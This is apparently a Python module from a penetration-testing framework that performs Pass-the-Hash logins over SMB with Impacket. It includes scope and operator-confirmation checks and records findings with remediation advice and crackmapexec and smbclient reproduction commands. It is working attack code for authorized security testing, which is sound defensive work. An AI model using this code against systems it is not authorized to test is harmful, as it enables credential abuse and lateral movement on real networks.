"""Pass the Hash module."""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.finding import Severity
from common.evidence import Evidence

CVSS_PTH_V31 = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
CVSS_PTH_V40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"

class PassHash(BaseModule):
    """Pass-the-Hash attack module using Impacket."""

    NAME = "pass_hash"
    DESCRIPTION = "Execute Pass-the-Hash authentication against SMB"
    PHASE = 7
    TAGS = ["attack", "pth", "smb", "authentication"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="Target out of scope")

        # We need a hash and a user to perform PtH
        username = self.config.extra.get("username")
        domain = self.config.extra.get("domain", "")
        hashes = self.config.extra.get("hashes")
        
        if not username or not hashes:
            self.log.error("Pass-the-Hash requires 'username' and 'hashes' (LM:NT format) in extra config")
            return self._make_result(start, skipped=True, skip_reason="Missing credentials")

        confirmed = self.confirm_action(
            module=self.NAME, 
            action="Pass-the-Hash", 
            target=target, 
            risk="Authentication with stolen hashes"
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        self.log.info("Attempting Pass-the-Hash against %s with user %s\\%s", target, domain, username)

        try:
            # We must import impacket here so we don't crash if it's missing globally
            from impacket.smbconnection import SMBConnection, SessionError
            import socket
            
            # Extract LM and NT hashes
            lmhash, nthash = "", ""
            if ":" in hashes:
                lmhash, nthash = hashes.split(":")
            else:
                nthash = hashes # Assume just NT hash if no colon

            await self.rate_limit()
            
            # Perform connection
            try:
                smb = SMBConnection(target, target, sess_port=445, timeout=self.config.timeout)
                # Attempt PtH login
                smb.login(username, '', domain, lmhash, nthash)
                
                is_admin = False
                # Check for admin access by listing C$
                try:
                    smb.listPath('C$', '\\*')
                    is_admin = True
                except SessionError:
                    pass
                
                # Close connection
                smb.logoff()
                
                # If we get here, login succeeded
                ev = Evidence(
                    request_raw=f"SMB Login: {domain}\\{username} using Hash: {hashes[:10]}...",
                    response_raw=f"Login Successful. Is Admin: {is_admin}",
                    extra={"username": username, "domain": domain, "is_admin": is_admin}
                )
                
                self.new_finding(
                    title=f"Successful Pass-the-Hash Authentication ({username})",
                    severity=Severity.CRITICAL if is_admin else Severity.HIGH,
                    description=(
                        f"Successfully authenticated to {target} via SMB using Pass-the-Hash for user {domain}\\{username}. "
                        f"Administrative access to C$: {is_admin}. "
                        "This confirms the NTLM hash is valid and can be used for lateral movement without the plaintext password."
                    ),
                    reproduction_steps=[
                        f"crackmapexec smb {target} -u {username} -d {domain} -H {hashes}",
                        f"smbclient //{target}/C$ -U {domain}\\\\{username} --pw-nt-hash {nthash}"
                    ],
                    remediation="Implement LAPS, restrict local admin rights, and enforce network segmentation to prevent lateral movement.",
                    references=["MITRE T1550.002", "https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_PTH_V31,
                    cvss_v40_vector=CVSS_PTH_V40,
                    target=target,
                    mitre_attack=["TA0008/T1550.002"]
                )
                
            except SessionError as e:
                self.log.info("PtH login failed for %s: %s", username, e)
            except (socket.error, Exception) as e:
                self.log.error("SMB connection failed: %s", e)

        except ImportError:
            self.log.error("Impacket is required for Pass-the-Hash module")
            return self._make_result(start, skipped=True, skip_reason="Impacket missing")

        return self._make_result(start)

class TestPassHash:
    def test_phase(self):
        assert PassHash.PHASE == 7
